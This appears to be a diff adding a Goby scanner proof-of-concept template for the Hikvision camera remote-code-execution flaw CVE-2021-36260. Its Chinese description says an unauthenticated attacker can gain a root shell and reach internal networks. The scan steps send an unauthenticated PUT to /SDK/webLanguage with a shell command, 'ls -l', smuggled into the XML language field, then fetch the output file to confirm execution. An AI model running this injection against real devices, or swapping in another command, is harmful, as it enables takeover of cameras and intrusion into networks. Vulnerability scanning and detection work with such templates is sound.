@@ -1,0 +1,112 @@
+{
+      "Name": "Hikvision RCE CVE-2021-36260",
+      "Level": "3",
+      "Tags": [
+            "rce"
+      ],
+      "GobyQuery": "app=\"Hikvision-Cameras-and-Surveillance\"",
+      "Description": "攻击者利用该漏洞可以用无限制的root shell来完全控制设备，即使设备的所有者受限于有限的受保护shell（psh）。除了入侵IP摄像头外，还可以访问和攻击内部网络。\n该漏洞的利用并不需要用户交互，攻击者只需要访问http或HTTPS服务器端口（80/443）即可利用该漏洞，无需用户名、密码、以及其他操作。摄像头本身也不会检测到任何登录信息。",
+      "Product": "hikvision",
+      "Homepage": "https://www.hikvision.com/cn/",
+      "Author": "aetkrad",
+      "Impact": "",
+      "Recommendation": "",
+      "References": [
+            "https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html"
+      ],
+      "HasExp": false,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastheader|regex|"
+                  ]
+            },
+            {
+                  "Request": {
+                        "method": "PUT",
+                        "uri": "/SDK/webLanguage",
+                        "follow_redirect": false,
+                        "header": {
+                              "X-Requested-With": "XMLHttpRequest",
+                              "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+                        },
+                        "data_type": "text",
+                        "data": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<language>$(ls -l >webLib/c)</language>",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "500",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/c",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody||"
+                  ]
+            }
+      ],
+      "PostTime": "2021-11-17 13:28:08",
+      "GobyVersion": "1.8.302"
+}
